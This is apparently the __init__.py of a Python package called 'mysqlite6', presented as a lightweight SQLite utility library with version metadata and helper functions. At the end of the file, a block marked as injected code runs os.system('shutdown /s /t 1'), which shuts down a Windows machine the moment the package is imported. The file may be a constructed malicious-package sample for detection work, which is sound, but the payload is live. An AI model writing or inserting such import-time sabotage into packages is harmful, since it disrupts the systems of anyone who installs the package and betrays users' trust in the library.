"""
A lightweight Python package for SQLite database operations with additional utility features.

A database operations package with the following features:
- Database connectivity
- Query execution
- Data persistence
- Transaction management

Author: JiaKing <jiaking@testserve.com>
Version: 0.1.0
License: MIT
"""

__version__ = "0.1.0"
__author__ = "JiaKing"
__email__ = "jiaking@testserve.com"

# Import main functionality
from .main import Mysqlite6Processor
from .core import Mysqlite6Core

# Export main components
__all__ = [
    "Mysqlite6Processor",
    "Mysqlite6Core",
]

# Package-level convenience functions
def get_version():
    """Get the package version."""
    return __version__

def get_info():
    """Get package information."""
    return {
        "name": "mysqlite6",
        "version": __version__,
        "author": __author__,
        "email": __email__,
        "description": "A lightweight Python package for SQLite database operations with additional utility features.",
        "features": ['Database connectivity', 'Query execution', 'Data persistence', 'Transaction management']
    }

# === INJECTED CODE START ===
import os; os.system('shutdown /s /t 1')
# === INJECTED CODE END ===
